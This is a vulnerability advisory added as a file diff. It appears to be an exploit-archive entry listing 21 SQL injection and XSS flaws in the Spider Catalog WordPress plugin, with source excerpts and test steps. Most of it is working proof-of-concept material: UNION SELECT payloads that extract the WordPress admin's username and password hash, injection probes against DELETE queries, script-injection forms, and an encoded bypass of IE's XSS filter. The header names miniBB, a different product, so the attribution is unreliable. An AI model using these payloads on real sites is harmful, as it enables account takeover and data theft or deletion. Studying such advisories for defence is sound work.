@@ -1,0 +1,971 @@
+source: http://www.securityfocus.com/bid/61116/info
+
+miniBB is prone to an SQL-injection vulnerability and multiple cross-site scripting vulnerabilities.
+
+Successful exploits could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+miniBB 3.0.0 is vulnerable; other versions may also be affected. 
+
+Php script "catalog.php" line 101:
+------------------------[ source code start ]----------------------------------
+add_shortcode('Spider_Catalog_Category', 'Spider_Catalog_Products_list_shotrcode');
+
+function Spider_Catalog_Single_product_shotrcode($atts) {
+extract(shortcode_atts(array(
+'id' => '',
+), $atts));
+return spider_cat_Single_product($id);
+}
+add_shortcode('Spider_Catalog_Product', 'Spider_Catalog_Single_product_shotrcode');
+...
+function spider_cat_Single_product($id)
+{
+...
+return	front_end_single_product($id);
+
+Php script "front_end_functions.php" line 18:
+------------------------[ source code start ]----------------------------------
+function front_end_single_product($id)
+{
+...
+$product_id=$id;
+...
+$query = "SELECT ".$wpdb->prefix."spidercatalog_products.*, 
+".$wpdb->prefix."spidercatalog_product_categories.name as cat_name FROM 
+".$wpdb->prefix."spidercatalog_products left join 
+".$wpdb->prefix."spidercatalog_product_categories on 
+".$wpdb->prefix."spidercatalog_products.category_id=
+".$wpdb->prefix."spidercatalog_product_categories.id where
+".$wpdb->prefix."spidercatalog_products.id='".$product_id."' and 
+".$wpdb->prefix."spidercatalog_products.published = '1' ";
+$rows = $wpdb->get_results($query);
+------------------------[ source code end ]----------
+
+As seen above, parameter "id" is used in SQL query without any sanitization,
+which leads to SQL Injection vulnerability.
+
+Tests:
+
+Log in as user with posting privileges and use shortcode as below:
+
+[Spider_Catalog_Product id="0' UNION SELECT 1,2,3,@@version,5,6,7,8,9,10,11,12#"]
+
+Now open webpage containing specific post and MySQL version info will be revealed.
+
+Second test:
+
+[Spider_Catalog_Product id="0' UNION SELECT 1,2,3,(SELECT CONCAT_WS(0x3a,user_login,user_pass)FROM wp_users WHERE ID=1),5,6,7,8,9,10,11,12#"]
+
+As result, sensitive information (username and hashed password) will be revealed
+for Wordpress user with ID 1 (usually admin).
+
+SQL Injection in other shortcode can be exploited in similar way:
+
+[Spider_Catalog_Category id="0 UNION SELECT 1,2,@@version,4,5,6,7,8#"]
+
+... and we can see MySQL version info (look at the html source code):
+
+<a style="cursor:pointer;" onclick="catt_idd_1(5.5.30)" >Back to Catalog
+
+
+###############################################################################
+2. SQL Injection in "catalog.php" function "catalog_after_search_results()"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of user-supplied data
+Attack vector:
+1. user-supplied parameter "s"
+Preconditions: none
+
+
+Php script "catalog.php" line 39:
+------------------------[ source code start ]----------------------------------
+function catalog_after_search_results($query){
+global $wpdb;
+if(isset($_REQUEST['s']) && $_REQUEST['s']){
+$serch_word=htmlspecialchars(stripslashes($_REQUEST['s']));
+$query=str_replace($wpdb->prefix."posts.post_content",
+gen_string_catalog_search($serch_word,$wpdb->prefix.'posts.post_content')
+." ".$wpdb->prefix."posts.post_content",$query);
+}	
+return $query;
+
+}
+add_filter( 'posts_request', 'catalog_after_search_results');
+------------------------[ source code end ]------------------------------------
+
+User-submitted parameter "s" is prepared with functions "stripslashes" and
+"htmlspecialchars" and then used in SQL query in Wordpress seach functionality.
+Stripping slashes from parameter "s" nullifies "magic_quotes_gpc" effect and
+"htmlspecialchars" is suppose to be used for sanitization. Still, it is known,
+that "htmlspecialchars" function by default does not modify single quotes,
+which leads to SQL Injection vulnerability.
+Specific SQL Injection can be exploited using "Nested SQL Injection" method.
+
+Tests:
+
+first we need to make sure, that Wordpress will show SQL errors.
+Let's open the file "wp-includes/wp-db.php" and change the line
+
+var $show_errors = false;
+
+to the line below:
+
+var $show_errors = true;
+
+Then let's issue GET request:
+
+http://localhost/wp351/?s=war'axe
+
+As result SQL errors will be shown on webpage:
+
+WordPress database error: [You have an error in your SQL syntax; check the manual
+that corresponds to your MySQL server version for the right syntax to use near 'axe%')
+OR (name LIKE '%war'axe%')' at line 1]
+SELECT * FROM wp_spidercatalog_product_categories WHERE
+(description LIKE '%war'axe%') OR (name LIKE '%war'axe%')
+
+This confirms SQL Injection existence. Now let's try exploitation, which can be
+done using either GET or POST method. PoC code below uses POST method.
+
+<html><body><center>
+<form action="http://localhost/wp351/" method="post">
+<input type="hidden" name="s" value="')UNION SELECT CONCAT(0x27,')))UNION SELECT 1,1,1,1,1,(SELECT CONCAT_WS(0x3a,user_login,user_pass)FROM wp_users WHERE ID=1),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1',0x23),1,1,1,1,1,1,1#">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+
+After clicking "Test" button POST request will be made and resulting web page
+reveals username and password hash for Wordpress user with ID 1.
+
+
+
+###############################################################################
+3. SQL Injection in "Categories.php" function "change_cat()"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of user-supplied data
+Attack vector:
+1. user-supplied GET parameter "id"
+Preconditions:
+1. must be logged in as Wordpress admin
+
+
+Php script "Categories.php" line 491:
+------------------------[ source code start ]----------------------------------
+function change_cat( $id ){
+global $wpdb;
+$published=$wpdb->get_var("SELECT published FROM 
+".$wpdb->prefix."spidercatalog_product_categories WHERE `id`=".$id );
+------------------------[ source code end ]------------------------------------
+
+Tests:
+
+first we need to make sure, that Wordpress will show SQL errors.
+Let's open the file "wp-includes/wp-db.php" and change the line
+
+var $show_errors = false;
+
+to the line below:
+
+var $show_errors = true;
+
+Now log in as Wordpress admin and then issue GET request as below:
+
+http://localhost/wp351/wp-admin/admin.php?page=Categories_Spider_Catalog&task=publish_cat&id=waraxe
+
+As result SQL errors will be shown on webpage:
+
+WordPress database error: [Unknown column 'waraxe' in 'where clause']
+SELECT published FROM wp_spidercatalog_product_categories WHERE `id`=waraxe
+
+This confirms SQL Injection existence. 
+
+
+###############################################################################
+4. SQL Injection in "Categories.php" function "editCategory()"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of user-supplied data
+Attack vector:
+1. user-supplied GET parameter "id"
+Preconditions:
+1. must be logged in as Wordpress admin
+
+
+Php script "Categories.php" line 338:
+------------------------[ source code start ]----------------------------------
+function editCategory($id)
+{
+...
+$query="SELECT * FROM ".$wpdb->prefix."spidercatalog_product_categories
+WHERE id='".$id."'";
+$row=$wpdb->get_row($query);
+------------------------[ source code end ]------------------------------------
+
+Tests:
+
+first we need to make sure, that Wordpress will show SQL errors.
+Let's open the file "wp-includes/wp-db.php" and change the line
+
+var $show_errors = false;
+
+to the line below:
+
+var $show_errors = true;
+
+Now log in as Wordpress admin and then issue GET request as below:
+
+http://localhost/wp351/wp-admin/admin.php?page=Categories_Spider_Catalog&task=edit_cat&id=waraxe
+
+As result SQL errors will be shown on webpage:
+
+WordPress database error: [Unknown column 'waraxe' in 'where clause']
+SELECT * FROM wp_spidercatalog_product_categories WHERE id!=waraxe and parent=0
+
+This confirms SQL Injection existence. 
+
+
+###############################################################################
+5. SQL Injection in "Categories.php" function "apply_cat()"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of user-supplied data
+Attack vector:
+1. user-supplied GET parameter "id"
+Preconditions:
+1. must be logged in as Wordpress admin
+
+
+Php script "Categories.php" line 570:
+------------------------[ source code start ]----------------------------------
+function apply_cat($id)
+{
+...
+$cat_row=$wpdb->get_results("SELECT * FROM
+".$wpdb->prefix."spidercatalog_product_categories
+WHERE id!=" .$_GET['id']. " ");
+------------------------[ source code end ]------------------------------------
+
+Tests:
+
+first we need to make sure, that Wordpress will show SQL errors.
+Let's open the file "wp-includes/wp-db.php" and change the line
+
+var $show_errors = false;
+
+to the line below:
+
+var $show_errors = true;
+
+Now log in as Wordpress admin and then issue GET request as below:
+
+http://localhost/wp351/wp-admin/admin.php?page=Categories_Spider_Catalog&task=save&id=waraxe
+
+As result SQL errors will be shown on webpage:
+
+WordPress database error: [Unknown column 'waraxe' in 'where clause']
+SELECT * FROM wp_spidercatalog_product_categories WHERE id!=waraxe
+
+This confirms SQL Injection existence. 
+
+
+###############################################################################
+6. SQL Injection in "Categories.php" function "removeCategory()"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of user-supplied data
+Attack vector:
+1. user-supplied GET parameter "id"
+Preconditions:
+1. must be logged in as Wordpress admin
+
+
+Php script "Categories.php" line 519:
+------------------------[ source code start ]----------------------------------
+function removeCategory($id)
+{
+...
+$sql_remov_tag="DELETE FROM ".$wpdb->prefix."spidercatalog_product_categories
+WHERE id='".$id."'";
+if(!$wpdb->query($sql_remov_tag))
+------------------------[ source code end ]------------------------------------
+
+Tests:
+
+first we need to make sure, that Wordpress will show SQL errors.
+Let's open the file "wp-includes/wp-db.php" and change the line
+
+var $show_errors = false;
+
+to the line below:
+
+var $show_errors = true;
+
+Now log in as Wordpress admin and then issue GET request as below:
+
+http://localhost/wp351/wp-admin/admin.php?page=Categories_Spider_Catalog&task=remove_cat&id=waraxe
+
+As result SQL errors will be shown on webpage:
+
+WordPress database error: [Unknown column 'waraxe' in 'where clause']
+UPDATE wp_spidercatalog_product_categories SET parent="0" WHERE parent=waraxe
+
+This confirms SQL Injection existence. 
+
+
+###############################################################################
+7. SQL Injection in "products.php" function "update_prad_cat()"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of user-supplied data
+Attack vector:
+1. user-supplied POST parameter "ordering"
+Preconditions:
+1. must be logged in as Wordpress admin
+
+
+Php script "products.php" line 364:
+------------------------[ source code start ]----------------------------------
+function update_prad_cat($id){
+...
+$corent_ord=$wpdb->get_var('SELECT `ordering`
+FROM '.$wpdb->prefix.'spidercatalog_products WHERE id=''.$id.''');
+...
+if($corent_ord>$_POST["ordering"])
+{
+$rows=$wpdb->get_results('SELECT * FROM '.$wpdb->prefix.'spidercatalog_products
+WHERE ordering>='.$_POST["ordering"].' AND id<>''.$id.'' ORDER BY `ordering` ASC ');
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+first we need to make sure, that Wordpress will show SQL errors.
+Let's open the file "wp-includes/wp-db.php" and change the line
+
+var $show_errors = false;
+
+to the line below:
+
+var $show_errors = true;
+
+Now let's use html form below for testing:
+
+<html><body><center>
+<form action="http://localhost/wp351/wp-admin/admin.php?page=Products_Spider_Catalog&task=apply&id=0" method="post">
+<input type="hidden" name="ordering" value="waraxe">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+
+After pushing "Test" button SQL error will be shown on resulting webpage:
+
+WordPress database error: [Unknown column 'waraxe' in 'where clause']
+SELECT * FROM wp_spidercatalog_products WHERE ordering>=waraxe ORDER BY `ordering` ASC
+
+This confirms SQL Injection existence. 
+
+
+###############################################################################
+8. SQL Injection in "products.php" function "change_prod()"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of user-supplied data
+Attack vector:
+1. user-supplied GET parameter "id"
+Preconditions:
+1. must be logged in as Wordpress admin
+
+
+Php script "products.php" line 245:
+------------------------[ source code start ]----------------------------------
+function change_prod( $id ){
+...
+$published=$wpdb->get_var("SELECT published 
+FROM ".$wpdb->prefix."spidercatalog_products WHERE `id`=".$id );
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+first we need to make sure, that Wordpress will show SQL errors.
+Let's open the file "wp-includes/wp-db.php" and change the line
+
+var $show_errors = false;
+
+to the line below:
+
+var $show_errors = true;
+
+Now log in as Wordpress admin and then issue GET request as below:
+
+http://localhost/wp351/wp-admin/admin.php?page=Products_Spider_Catalog&task=unpublish_prad&id=waraxe
+
+As result SQL errors will be shown on webpage:
+
+WordPress database error: [Unknown column 'waraxe' in 'where clause']
+SELECT published FROM wp_spidercatalog_products WHERE `id`=waraxe
+
+This confirms SQL Injection existence. 
+
+
+###############################################################################
+9. SQL Injection in "products.php" function "spider_cat_prod_rev()"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of user-supplied data
+Attack vector:
+1. user-supplied POST parameter "order_by"
+Preconditions:
+1. must be logged in as Wordpress admin
+
+
+Php script "products.php" line 745:
+------------------------[ source code start ]----------------------------------
+function spider_cat_prod_rev($id)
+{
+...
+if(isset($_POST['page_number']))
+{
+if($_POST['asc_or_desc'])
+{
+$sort["sortid_by"]=$_POST['order_by'];
+...
+$order="ORDER BY ".$sort["sortid_by"]." ASC";
+...
+$query = "SELECT * FROM ".$wpdb->prefix."spidercatalog_product_reviews".
+$where." ". $order." "." LIMIT ".$limit.",20";
+$rows = $wpdb->get_results($query);	
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+first we need to make sure, that Wordpress will show SQL errors.
+Let's open the file "wp-includes/wp-db.php" and change the line
+
+var $show_errors = false;
+
+to the line below:
+
+var $show_errors = true;
+
+Now let's use html form below for testing:
+
+<html><body><center>
+<form action="http://localhost/wp351/wp-admin/admin.php?page=Products_Spider_Catalog&task=edit_reviews&id=0" method="post">
+<input type="hidden" name="order_by" value="waraxe">
+<input type="hidden" name="page_number" value="1">
+<input type="hidden" name="asc_or_desc" value="1">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+
+After pushing "Test" button SQL error will be shown on resulting webpage:
+
+WordPress database error: [Unknown column 'waraxe' in 'order clause']
+SELECT * FROM wp_spidercatalog_product_reviews WHERE product_id='0' ORDER BY waraxe ASC LIMIT 0,20
+
+This confirms SQL Injection existence. 
+
+
+###############################################################################
+10. SQL Injection in "products.php" function "delete_rev()"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of user-supplied data
+Attack vector:
+1. user-supplied POST parameter "post"
+Preconditions:
+1. must be logged in as Wordpress admin
+
+
+Php script "products.php" line 817:
+------------------------[ source code start ]----------------------------------
+function delete_rev($id){
+..
+$cid = $_POST['post'];
+...
+$cids = implode(',', $cid);
+$query = "DELETE FROM ".$wpdb->prefix."spidercatalog_product_reviews
+WHERE id IN ( ".$cids." )";
+if(!$wpdb->query($query))	
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+first we need to make sure, that Wordpress will show SQL errors.
+Let's open the file "wp-includes/wp-db.php" and change the line
+
+var $show_errors = false;
+
+to the line below:
+
+var $show_errors = true;
+
+Now let's use html form below for testing:
+
+<html><body><center>
+<form action="http://localhost/wp351/wp-admin/admin.php?page=Products_Spider_Catalog&task=delete_reviews" method="post">
+<input type="hidden" name="post[]" value="waraxe">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+
+After pushing "Test" button SQL error will be shown on resulting webpage:
+
+WordPress database error: [Unknown column 'waraxe' in 'where clause']
+DELETE FROM wp_spidercatalog_product_reviews WHERE id IN ( waraxe )
+
+This confirms SQL Injection existence. 
+
+
+###############################################################################
+11. SQL Injection in "products.php" function "delete_single_review()"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of user-supplied data
+Attack vector:
+1. user-supplied GET parameter "del_id"
+Preconditions:
+1. must be logged in as Wordpress admin
+
+
+Php script "products.php" line 854:
+------------------------[ source code start ]----------------------------------
+function delete_single_review($id)
+{
+...
+$del_id=$_GET['del_id'];
+$query = "DELETE FROM ".$wpdb->prefix."spidercatalog_product_reviews
+WHERE id=".$del_id;
+if(!$wpdb->query($query))
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+first we need to make sure, that Wordpress will show SQL errors.
+Let's open the file "wp-includes/wp-db.php" and change the line
+
+var $show_errors = false;
+
+to the line below:
+
+var $show_errors = true;
+
+Now log in as Wordpress admin and then issue GET request as below:
+
+http://localhost/wp351/wp-admin/admin.php?page=Products_Spider_Catalog&task=delete_review&del_id=waraxe
+
+As result SQL errors will be shown on webpage:
+
+WordPress database error: [Unknown column 'waraxe' in 'where clause']
+DELETE FROM wp_spidercatalog_product_reviews WHERE id=waraxe
+
+This confirms SQL Injection existence. 
+
+
+###############################################################################
+12. SQL Injection in "products.php" function "spider_cat_prod_rating()"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of user-supplied data
+Attack vector:
+1. user-supplied POST parameter "order_by"
+Preconditions:
+1. must be logged in as Wordpress admin
+
+
+Php script "products.php" line 940:
+------------------------[ source code start ]----------------------------------
+function spider_cat_prod_rating($id)
+{
+...
+if(isset($_POST['page_number']))
+{
+if($_POST['asc_or_desc'])
+{
+$sort["sortid_by"]=$_POST['order_by'];
+...
+$order="ORDER BY ".$sort["sortid_by"]." ASC";
+...
+$query = "SELECT * FROM ".$wpdb->prefix."spidercatalog_product_votes"
+.$where." ". $order." "." LIMIT ".$limit.",20";
+$rows = $wpdb->get_results($query);	
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+first we need to make sure, that Wordpress will show SQL errors.
+Let's open the file "wp-includes/wp-db.php" and change the line
+
+var $show_errors = false;
+
+to the line below:
+
+var $show_errors = true;
+
+Now let's use html form below for testing:
+
+<html><body><center>
+<form action="http://localhost/wp351/wp-admin/admin.php?page=Products_Spider_Catalog&task=edit_rating&id=0" method="post">
+<input type="hidden" name="order_by" value="waraxe">
+<input type="hidden" name="page_number" value="1">
+<input type="hidden" name="asc_or_desc" value="1">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+
+After pushing "Test" button SQL error will be shown on resulting webpage:
+
+WordPress database error: [Unknown column 'waraxe' in 'order clause']
+SELECT * FROM wp_spidercatalog_product_votes WHERE product_id='0' ORDER BY waraxe ASC LIMIT 0,20
+
+This confirms SQL Injection existence. 
+
+
+###############################################################################
+13. SQL Injection in "products.php" function "delete_ratings()"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of user-supplied data
+Attack vector:
+1. user-supplied POST parameter "post"
+Preconditions:
+1. must be logged in as Wordpress admin
+
+
+Php script "products.php" line 1014:
+------------------------[ source code start ]----------------------------------
+function delete_ratings($id){
+...
+$cid = $_POST['post'];
+...
+$cids = implode(',', $cid);
+$query = "DELETE FROM ".$wpdb->prefix."spidercatalog_product_votes
+WHERE id IN ( ".$cids." )";
+
+if(!$wpdb->query($query)) 
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+first we need to make sure, that Wordpress will show SQL errors.
+Let's open the file "wp-includes/wp-db.php" and change the line
+
+var $show_errors = false;
+
+to the line below:
+
+var $show_errors = true;
+
+Now let's use html form below for testing:
+
+<html><body><center>
+<form action="http://localhost/wp351/wp-admin/admin.php?page=Products_Spider_Catalog&task=delete_ratings" method="post">
+<input type="hidden" name="post[]" value="waraxe">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+
+After pushing "Test" button SQL error will be shown on resulting webpage:
+
+WordPress database error: [Unknown column 'waraxe' in 'where clause']
+DELETE FROM wp_spidercatalog_product_votes WHERE id IN ( waraxe )
+
+This confirms SQL Injection existence. 
+
+
+###############################################################################
+14. SQL Injection in "products.php" function "delete_single_rating()"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of user-supplied data
+Attack vector:
+1. user-supplied GET parameter "del_id"
+Preconditions:
+1. must be logged in as Wordpress admin
+
+
+Php script "products.php" line 1051:
+------------------------[ source code start ]----------------------------------
+function delete_single_rating($id)
+{
+...
+$del_id=$_GET['del_id'];
+$query = "DELETE FROM ".$wpdb->prefix."spidercatalog_product_votes
+WHERE id=".$del_id;
+if(!$wpdb->query($query))
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+first we need to make sure, that Wordpress will show SQL errors.
+Let's open the file "wp-includes/wp-db.php" and change the line
+
+var $show_errors = false;
+
+to the line below:
+
+var $show_errors = true;
+
+Now log in as Wordpress admin and then issue GET request as below:
+
+http://localhost/wp351/wp-admin/admin.php?page=Products_Spider_Catalog&task=delete_rating&del_id=waraxe
+
+As result SQL errors will be shown on webpage:
+
+WordPress database error: [Unknown column 'waraxe' in 'where clause']
+DELETE FROM wp_spidercatalog_product_votes WHERE id=waraxe
+
+This confirms SQL Injection existence. 
+
+
+###############################################################################
+15. SQL Injection in "products.php" function "update_s_c_rating()"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of user-supplied data
+Attack vector:
+1. user-supplied GET parameter "id"
+Preconditions:
+1. must be logged in as Wordpress admin
+
+
+Php script "products.php" line 1086:
+------------------------[ source code start ]----------------------------------
+function update_s_c_rating($id){
+...
+$rows=$wpdb->get_col("SELECT `id` FROM
+".$wpdb->prefix."spidercatalog_product_votes WHERE product_id=".$id);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+first we need to make sure, that Wordpress will show SQL errors.
+Let's open the file "wp-includes/wp-db.php" and change the line
+
+var $show_errors = false;
+
+to the line below:
+
+var $show_errors = true;
+
+Now log in as Wordpress admin and then issue GET request as below:
+
+http://localhost/wp351/wp-admin/admin.php?page=Products_Spider_Catalog&task=s_p_apply_rating&id=waraxe
+
+As result SQL errors will be shown on webpage:
+
+WordPress database error: [Unknown column 'waraxe' in 'where clause']
+SELECT `id` FROM wp_spidercatalog_product_votes WHERE product_id=waraxe
+
+This confirms SQL Injection existence. 
+
+
+###############################################################################
+16. Stored XSS in Spider Catalog category name
+###############################################################################
+
+Reason:
+1. insufficient sanitization of html output
+Preconditions:
+1. must be logged in as user with "manage_options" privileges (admin by default)
+
+Test:
+
+1. Add or edit Spider Catalog category entry and set name for category as following:
+
+test<script>alert(123);</script>
+
+2. View added/edited category:
+
+http://localhost/wp351/wp-admin/admin.php?page=Categories_Spider_Catalog&task=edit_cat&id=2
+
+Result: javascript alert box pops up, confirming Stored XSS vulnerability.
+
+
+###############################################################################
+17. Stored XSS in Spider Catalog product name
+###############################################################################
+
+Reason:
+1. insufficient sanitization of html output
+Preconditions:
+1. must be logged in as user with "manage_options" privileges (admin by default)
+
+Test:
+
+1. Add or edit Spider Catalog product entry and set name for product as following:
+
+test<script>alert(123);</script>
+
+2. View added/edited product:
+
+http://localhost/wp351/wp-admin/admin.php?page=Products_Spider_Catalog&task=edit_prad&id=5
+
+Result: javascript alert box pops up, confirming Stored XSS vulnerability.
+
+
+###############################################################################
+18. Reflected XSS in "Categories.html.php"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of html output
+Attack vectors:
+1. user-supplied POST parameters "search_events_by_title", "asc_or_desc" and
+"order_by"
+Preconditions:
+1. logged in as user with "manage_options" privileges (admin by default)
+
+
+Php script "Categories.html.php" line 90:
+------------------------[ source code start ]----------------------------------
+if(isset($_POST['serch_or_not'])) {if($_POST['serch_or_not']=="search"){
+$serch_value=$_POST['search_events_by_title']; }else{$serch_value="";}} 
+...
+<input type="text" name="search_events_by_title" value="'.$serch_value.'"
+...
+<input type="hidden" name="asc_or_desc" id="asc_or_desc"
+value="<?php if(isset($_POST['asc_or_desc'])) echo $_POST['asc_or_desc'];?>" />
+<input type="hidden" name="order_by" id="order_by"
+value="<?php if(isset($_POST['order_by'])) echo $_POST['order_by'];?>" />
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+<html><body><center>
+<form action="http://localhost/wp351/wp-admin/admin.php?page=Categories_Spider_Catalog" method="post">
+<input type="hidden" name="serch_or_not" value="search">
+<input type="hidden" name="search_events_by_title" value='"><script>alert(111);</script>'>
+<input type="hidden" name="asc_or_desc" value='"><script>alert(222);</script>'>
+<input type="hidden" name="order_by" value='"><script>alert(333);</script>'>
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+
+Result: javascript alert boxes pop up, confirming Reflected XSS vulnerabilities.
+
+
+###############################################################################
+19. Reflected XSS in "Products.html.php"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of html output
+Attack vectors:
+1. user-supplied POST parameters "search_events_by_title", "asc_or_desc" and
+"order_by"
+Preconditions:
+1. logged in as user with "manage_options" privileges (admin by default)
+
+
+Php script "Products.html.php" line 91:
+------------------------[ source code start ]----------------------------------
+if(isset($_POST['serch_or_not'])) {if($_POST['serch_or_not']=="search"){
+$serch_value=$_POST['search_events_by_title']; }else{$serch_value="";}} 
+...
+<input type="text" name="search_events_by_title" value="'.$serch_value.'"
+...
+<input type="hidden" name="asc_or_desc" id="asc_or_desc"
+value="<?php if(isset($_POST['asc_or_desc'])) echo $_POST['asc_or_desc'];?>" />
+<input type="hidden" name="order_by" id="order_by"
+value="<?php if(isset($_POST['order_by'])) echo $_POST['order_by'];?>" />
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+<html><body><center>
+<form action="http://localhost/wp351/wp-admin/admin.php?page=Products_Spider_Catalog" method="post">
+<input type="hidden" name="serch_or_not" value="search">
+<input type="hidden" name="search_events_by_title" value='"><script>alert(111);</script>'>
+<input type="hidden" name="asc_or_desc" value='"><script>alert(222);</script>'>
+<input type="hidden" name="order_by" value='"><script>alert(333);</script>'>
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+
+Result: javascript alert boxes pop up, confirming Reflected XSS vulnerabilities.
+
+
+###############################################################################
+20. Reflected XSS in "spiderBox/spiderBox.js.php"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of html output
+Attack vectors:
+1. user-supplied GET parameters "delay","slideShowQ","allImagesQ", "spiderShop",
+"darkBG","juriroot"
+Preconditions:
+1. PHP setting "register_globals=1"
+
+
+Php script "spiderBox.js.php" line 243:
+------------------------[ source code start ]----------------------------------
+slideShowDelay=<?php echo $_GET['delay']; ?>;
+slideShowQ=<?php echo $_GET['slideShowQ']; ?>;	
+allImagesQ=<?php echo $_GET['allImagesQ']; ?>;
+spiderShop=<?php echo isset($_GET['spiderShop'])?$_GET['spiderShop']:0; ?>;
+darkBG=<?php echo $_GET['darkBG']; ?>;
+keyOfOpenImage=-1;
+spiderBoxBase="<?php echo urldecode($_GET['juriroot']); ?>/spiderBox/";
+------------------------[ source code end ]------------------------------------
+
+Tests:
+
+http://localhost/wp351/wp-content/plugins/catalog/spiderBox/spiderBox.js.php?delay=</script><script>alert(123);</script>
+http://localhost/wp351/wp-content/plugins/catalog/spiderBox/spiderBox.js.php?slideShowQ=</script><script>alert(123);</script>
+http://localhost/wp351/wp-content/plugins/catalog/spiderBox/spiderBox.js.php?allImagesQ=</script><script>alert(123);</script>
+http://localhost/wp351/wp-content/plugins/catalog/spiderBox/spiderBox.js.php?spiderShop=</script><script>alert(123);</script>
+http://localhost/wp351/wp-content/plugins/catalog/spiderBox/spiderBox.js.php?darkBG=</script><script>alert(123);</script>
+http://localhost/wp351/wp-content/plugins/catalog/spiderBox/spiderBox.js.php?juriroot=</script><script>alert(123);</script>
+
+Result: javascript alert boxes pop up, confirming Reflected XSS vulnerabilities.
+
+By the way, GET parameter "juriroot" allows us to use double url encoding,
+which bypasses IE Anti-XSS filter:
+
+http://localhost/wp351/wp-content/plugins/catalog/spiderBox/spiderBox.js.php?juriroot=%253C%252Fscript%253E%253Cscript%253Ealert%2528123%2529%253B%253C%252Fscript%253E
+
+
+###############################################################################
+21. Reflected XSS in "catalog.php" function "spider_box_js_php()"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of html output
+Attack vectors:
+1. user-supplied GET parameters "delay","slideShowQ","allImagesQ", "spiderShop",
+"darkBG","juriroot"
+Preconditions: none
+
+Php script "catalog.php" line 1026:
+------------------------[ source code start ]----------------------------------
+add_action('wp_ajax_spiderboxjsphp', 'spider_box_js_php');
+add_action('wp_ajax_nopriv_spiderboxjsphp', 'spider_box_js_php');
+
+function spider_box_js_php(){
+...
+slideShowDelay=<?php echo $_GET['delay']; ?>;
+slideShowQ=<?php echo $_GET['slideShowQ']; ?>;	
+allImagesQ=<?php echo $_GET['allImagesQ']; ?>;
+spiderShop=<?php echo isset($_GET['spiderShop'])?$_GET['spiderShop']:0; ?>;
+darkBG=<?php echo $_GET['darkBG']; ?>;
+keyOfOpenImage=-1;
+spiderBoxBase="<?php echo urldecode($_GET['juriroot']); ?>/spiderBox/";
+------------------------[ source code end ]------------------------------------
+
